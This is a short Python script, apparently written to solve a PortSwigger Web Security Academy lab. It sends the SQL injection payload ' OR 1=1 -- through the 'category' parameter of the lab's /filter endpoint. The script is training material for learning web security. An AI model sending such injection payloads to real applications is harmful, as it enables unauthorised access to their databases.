import requests
from colorama import Fore

LAB_URL = "https://0aeb00cb0394839183290090004b00a9.web-security-academy.net"

print(LAB_URL)

def main():
		print("⦗#⦘ Injection parameter: " + Fore.YELLOW + "category")
		payload = "' OR 1=1 --"
		injection = fetch(f"/filter?category={payload}")
					

def fetch(path, cookies = None):
    try:  
        return requests.get(f"{LAB_URL}{path}", cookies=cookies, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to fetch " + path + " through exception")
        exit(1)


if __name__ == "__main__":
    main()
